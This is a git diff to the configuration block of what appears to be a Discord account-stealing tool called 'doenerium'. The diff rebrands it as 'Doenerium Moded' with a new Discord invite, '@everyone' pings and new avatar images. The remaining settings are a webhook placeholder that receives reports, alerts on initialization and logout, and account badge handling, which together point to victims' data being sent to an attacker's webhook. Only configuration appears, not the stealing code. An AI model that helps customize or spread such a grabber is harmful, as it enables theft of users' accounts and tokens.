@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "saintpaşa",
 
     webhook: "%WEBHOOK_LINK%",
 
@@ -20,16 +20,16 @@ var config = {
 
     notify_on_logout: false,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@everyone"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "Doenerium Moded | discord.gg/kurdistan",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `Doenerium Moded | discord.gg/kurdistan`,
+            icon_url: "https://cdn.discordapp.com/attachments/1021747119696134204/1024641101153456148/uzgun.png",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "https://discord.gg/kurdistan",
+        avatar_url: "https://cdn.discordapp.com/attachments/1021747119696134204/1024641101153456148/uzgun.png"
     },
 
     badges: {
